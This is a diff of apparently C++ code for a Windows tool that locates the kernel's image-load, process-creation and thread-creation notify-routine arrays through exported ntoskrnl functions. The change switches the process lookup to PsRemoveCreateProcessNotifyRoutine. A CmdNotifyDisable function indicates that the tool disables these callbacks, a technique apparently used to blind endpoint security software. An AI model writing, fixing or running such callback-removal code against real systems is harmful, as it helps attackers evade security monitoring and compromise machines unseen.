@@ -168,7 +168,7 @@ void CmdNotify(bool doImage, bool doProcess, bool doThread) {
 
     struct { const char* label; const char* exportFn; bool enabled; DWORD64 arrayVA; } sections[] = {
         { "LoadImage",     "PsRemoveLoadImageNotifyRoutine",     doImage,   0 },
-        { "CreateProcess", "PsSetCreateProcessNotifyRoutine",   doProcess, 0 },
+        { "CreateProcess", "PsRemoveCreateProcessNotifyRoutine", doProcess, 0 },
         { "CreateThread",  "PsRemoveCreateThreadNotifyRoutine",  doThread,  0 },
     };
 
@@ -181,12 +181,12 @@ void CmdNotify(bool doImage, bool doProcess, bool doThread) {
     // PsSetCreateProcessNotifyRoutineEx's first LEA may land on the same array.
     for (auto& s : sections) {
         if (!s.enabled) continue;
-        DWORD64 skip = (strcmp(s.exportFn, "PsSetCreateProcessNotifyRoutine") == 0)
+        DWORD64 skip = (strcmp(s.exportFn, "PsRemoveCreateProcessNotifyRoutine") == 0)
                        ? sections[0].arrayVA : 0;
         s.arrayVA = FindArrayViaExport(hNt, userBase, kernBase, s.exportFn,
                                        skip, dataBase, dataEnd);
-        // Fallback for CreateProcess
-        if (!s.arrayVA && strcmp(s.exportFn, "PsSetCreateProcessNotifyRoutine") == 0) {
+        // Fallback for CreateProcess: try Set/Ex variants if Remove isn't found
+        if (!s.arrayVA && strcmp(s.exportFn, "PsRemoveCreateProcessNotifyRoutine") == 0) {
             DBG("CreateProcess: primary failed, trying Ex fallback\n");
             s.arrayVA = FindArrayViaExport(hNt, userBase, kernBase,
                                            "PsSetCreateProcessNotifyRoutineEx",
@@ -255,8 +255,8 @@ void CmdNotifyDisable(unsigned long long targetFn) {
     DWORD64 arrays[3]{};
     arrays[0] = FindArrayViaExport(hNt, userBase, kernBase, exportNames[0],
                                    0, dataBase, dataEnd);
-    // Try PsSetCreateProcessNotifyRoutine first; fall back to Ex variant
-    arrays[1] = FindArrayViaExport(hNt, userBase, kernBase, "PsSetCreateProcessNotifyRoutine",
+    // Try PsRemoveCreateProcessNotifyRoutine first; fall back to Ex variant
+    arrays[1] = FindArrayViaExport(hNt, userBase, kernBase, "PsRemoveCreateProcessNotifyRoutine",
                                    arrays[0], dataBase, dataEnd);
     if (!arrays[1])
         arrays[1] = FindArrayViaExport(hNt, userBase, kernBase, exportNames[1],
